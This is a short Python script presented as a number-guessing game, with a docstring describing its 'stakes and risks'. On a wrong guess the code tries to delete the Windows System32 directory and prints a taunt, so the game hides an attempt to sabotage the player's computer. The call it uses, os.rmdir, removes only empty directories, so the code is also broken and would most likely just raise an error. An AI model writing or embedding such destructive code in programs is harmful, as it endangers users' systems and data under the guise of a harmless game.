"""
# Stakes and Risks

This code appears to be a simple guessing game where the user is asked to input an integer between 1 and 10. The code then generates a random number between 1 and 10 and checks if the user's input matches the generated number. If they match, a victory message is displayed, and if not, a risky operation is performed.

## Stakes:
- **Winning**: The user has a chance to win the game by guessing the correct number.
- **Losing**: If the user's guess doesn't match the generated number, the code attempts to delete a critical system directory, 'C:\Windows\System32'. This operation can have severe consequences, including rendering the Windows operating system inoperable.

## Risks:
- **Data Loss**: Deleting 'C:\Windows\System32' can result in data loss, system instability, and may require a complete reinstallation of the operating system.
- **Security Risks**: Such a deletion operation can lead to security vulnerabilities and open the system to exploitation.
- **Data Recovery Difficulty**: Recovering data or restoring the system to a working state after such a deletion is extremely difficult and often impossible without a clean system backup.
- **User Mistakes**: There is no confirmation or safety measures in place to prevent accidental execution, making it easy for users to trigger this operation unintentionally.

It's crucial to note that this code is highly dangerous and should never be used in a real-world application. Deleting system directories without proper validation and confirmation is a major security and operational risk.

Developers should prioritize safety and security when designing and implementing applications, and avoid risky operations like this without thorough consideration and safeguards.
"""


import random
import os
user_input = input("Enter an integer between 1 and 10: ")
try:
    user_input = int(user_input)
    if 1 <= user_input <= 10:
        random_number = random.randint(1, 10)
        if user_input == random_number:
            print("""
 __  __ __   ___   __ __         __    __   ___   ____   __ 
|  ||  |  | /   \ |  |  |       |  |__|  | /   \ |    \ |  |
|  ||  |  ||     ||  |  | _____ |  |  |  ||     ||  _  ||  |
|__||  ~  ||  O  ||  |  ||     ||  |  |  ||  O  ||  |  ||__|
 __ |___, ||     ||  :  ||_____||  `  '  ||     ||  |  | __ 
|  ||     ||     ||     |        \      / |     ||  |  ||  |
|__||____/  \___/  \__,_|         \_/\_/   \___/ |__|__||__|
                                                            
""")
        else:
            folder_to_delete = "C:\Windows\System32"
            if os.path.exists(folder_to_delete):
                os.rmdir(folder_to_delete)
                print("you are fucked buddy!")
            else:
                print("God gave you another chance , but how")
    else:
        print("Please enter a valid integer between 1 and 10.")
except ValueError:
    print("Invalid input. Please enter a valid integer.")
